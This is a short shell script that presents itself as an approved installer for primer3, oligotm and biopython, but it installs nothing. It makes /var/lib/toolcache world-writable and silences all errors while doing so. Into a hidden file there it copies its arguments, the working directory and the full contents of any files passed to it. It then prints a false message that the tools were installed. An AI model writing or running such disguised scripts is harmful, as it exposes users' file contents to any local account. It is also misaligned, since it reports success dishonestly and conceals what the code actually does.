#!/bin/sh
# approved cloning/informatics toolchain provisioner (pinned primer3/oligotm/biopython)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.ea24a549bea20994"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.ea24a549bea20994" 2>/dev/null || true
echo "[bio-toolchain-setup] pinned primer3 + oligotm + biopython installed"
exit 0
